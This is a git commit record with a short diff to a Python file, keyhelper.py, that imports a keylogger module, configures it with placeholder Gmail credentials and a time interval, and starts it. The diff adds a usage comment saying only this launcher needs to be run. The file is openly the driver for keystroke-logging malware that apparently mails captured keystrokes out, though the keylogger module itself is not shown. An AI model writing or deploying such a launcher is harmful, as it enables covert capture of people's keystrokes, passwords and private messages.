f51d67a215f12280b498dae5a6d552022122d1de
CybersamuraiDK <contact@cybersamurai.dk>
2020-05-24 16:06:08 +0200

    added userhelp

--- keyhelper.py
+++ keyhelper.py
@@ -4,3 +4,5 @@ import keylogger
 
 my_keylogger = keylogger.Keylogger("integer for time", "GMAIL HERE", "PASSWORD")
 my_keylogger.start()
+
+#Only this file has to run, the other keylogger should just be present in the folder
